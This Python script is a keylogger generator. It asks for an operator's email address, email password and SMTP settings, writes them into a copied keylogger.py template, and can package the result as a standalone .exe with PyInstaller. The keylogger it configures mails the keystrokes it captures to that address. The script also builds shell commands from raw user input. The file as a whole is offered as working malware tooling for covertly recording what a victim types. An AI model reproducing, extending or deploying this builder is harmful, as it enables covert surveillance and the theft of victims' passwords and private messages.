import shutil
import os
import time

# pip install pyinstaller


class keylogger_generator():
    def __init__(self):

        self.keylogger_output_location = input("Please enter the output location: ")


        self.keylogger_email = input("Please type your email address: ")
        self.keylogger_password = input("Please enter your email password: ")
        self.keylogger_smtp_server_address = input("Please enter your smtp server address: ")
        self.keylogger_smtp_server_port = input("Please enter your smtp server port: ")
        self.keylogger_character_limit = input("Please enter the character limit per mail: ")

        self.personalise_file()

    def replace_string_in_file(self, filename, inputstring, outputstring):
        # Read in the file
        with open(filename, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace(inputstring, outputstring)

        # Write the file out again
        with open(filename, 'w') as file:
            file.write(filedata)

    def personalise_file(self):


        copy_file_name = self.keylogger_output_location
        print(copy_file_name)

        self.complete_file_name = copy_file_name + "/keylogger.py"

        self.cd_name = copy_file_name

        os.mkdir(copy_file_name)
        shutil.copy("../keylogger/keylogger.py", copy_file_name)

        self.replace_string_in_file(self.complete_file_name, "<paste_email_here>", self.keylogger_email)
        self.replace_string_in_file(self.complete_file_name, "<paste_password_here>", self.keylogger_password)
        self.replace_string_in_file(self.complete_file_name, "<paste_smtp_address_here>", self.keylogger_smtp_server_address)
        self.replace_string_in_file(self.complete_file_name, "<paste_smtp_port_here>", self.keylogger_smtp_server_port)
        self.replace_string_in_file(self.complete_file_name, "<paste_char_limit_here>", self.keylogger_character_limit)

        ask_conv_to_exe = input("Ok: The generation was successful. Do you want to generate an .exe file? (y/n): ")

        if ask_conv_to_exe == "y" or ask_conv_to_exe == "Y":
            self.convert_to_exe()
        else:
            quit("Ok. Have a nice day. Bye!")

    def convert_to_exe(self):
            os.system("cd " + self.cd_name)
            time.sleep(2)
            os.system("python -m PyInstaller --onefile " + self.complete_file_name)

            print("---- Complete ----")

keylogger_generator()